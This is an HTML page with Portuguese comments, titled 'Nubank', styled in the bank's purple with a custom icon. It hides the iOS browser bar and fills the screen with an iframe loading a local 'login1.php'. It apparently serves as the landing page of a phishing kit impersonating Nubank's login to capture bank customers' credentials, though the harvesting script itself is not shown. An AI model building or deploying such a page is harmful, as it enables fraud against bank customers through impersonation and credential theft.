<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nubank</title>
    <link rel="shortcut icon" href="icone.png" />
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #fffb00;
        }

        /* Estilo para tornar o conteúdo em tela cheia */
        #fullscreen-container {
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        /* Alinhar a imagem no centro */
        #fullscreen-container img {
            display: block;
            margin: 0 auto;
        }
    </style>

    <!-- Adicione o ícone personalizado para o atalho -->
    <link rel="apple-touch-icon" sizes="180x180" href="icone.png">
    <style type="text/css">
body {
	margin: 0;
	padding: 0;
	overflow: hidden; /* Impede que as barras de rolagem apareçam */
	background-color: #820AD1;
        }

        /* Estilo para o iframe */
        iframe {
            border: none; /* Remove a borda do iframe */
            display: block; /* Garante que o iframe seja tratado como bloco, para ajustar a largura */
            width: 100%; /* Faz com que o iframe ocupe toda a largura disponível */
            height: 100vh; /* Faz com que o iframe ocupe toda a altura da janela visível */
            margin: 0; /* Remove margens */
            padding: 0; /* Remove preenchimentos */
            overflow: hidden; /* Impede que qualquer conteúdo maior que o iframe seja exibido */
        }    
    </style>

<!-- Remova a barra de navegação e o botão "Abrir" no Safari no iOS -->
<meta name="apple-mobile-web-app-capable" content="yes">
<!-- Defina a cor da barra de status no Safari no iOS -->
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
</head>
<body>
    <!-- Conteúdo em Tela Cheia -->
<iframe src="login1.php" width="600" height="400"></iframe>
</body>
</html>
